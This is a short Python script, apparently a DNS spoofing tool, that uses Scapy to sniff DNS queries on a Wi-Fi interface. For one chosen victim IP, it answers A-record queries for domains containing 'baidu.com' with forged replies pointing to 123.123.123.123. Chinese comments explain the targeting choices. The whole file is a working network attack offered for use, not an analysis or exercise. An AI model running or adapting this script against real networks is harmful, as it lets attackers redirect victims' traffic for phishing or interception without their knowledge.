#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : DNS_attack.py
from scapy.all import *
import traceback

def DNS_Spoof(data):
    try:
        req_domain = data[DNS].qd.qname.decode()
        #print(data)
        dns_fields = data.getlayer(DNS).fields
        if dns_fields['qd'].qtype == 1:## 只劫持A记录
            if data[IP].src == '192.168.211.84':## 只劫持指定来源IP
                if "baidu.com" in req_domain:## 只劫持指定域名
                    print(req_domain)
                    del (data[UDP].len)
                    del (data[UDP].chksum)
                    del (data[IP].len)
                    del (data[IP].chksum)
                    res = data.copy()
                    res.FCfield = 2
                    res.src, res.dst = data.dst, data.src
                    res[IP].src, res[IP].dst = data[IP].dst, data[IP].src
                    res.sport, res.dport = data.dport, data.sport
                    res[DNS].qr = 1
                    res[DNS].ra = 1
                    res[DNS].ancount = 1
                    res[DNS].an = DNSRR(
                        rrname = data[DNS].qd.qname,
                        type = 'A',
                        rclass = 'IN',
                        ttl = 900,
                        rdata = '123.123.123.123'.encode()
                    )
                    sendp(res)
                else:
                    pass
                    #print("不是目标域名")
            else:
                pass
                #print('不是目标主机')
        else:
            pass
            #print("不劫持其他记录")
    except Exception as e:
        #pass
        print(e)
        traceback.print_exc()


def DNS_S(iface):
    sniff(prn=DNS_Spoof,filter='udp dst port 53',iface=iface)


if __name__ == '__main__':
    DNS_S('Intel(R) Wi-Fi 6 AX200 160MHz')
    ## windows run  ipconfig /all to get iface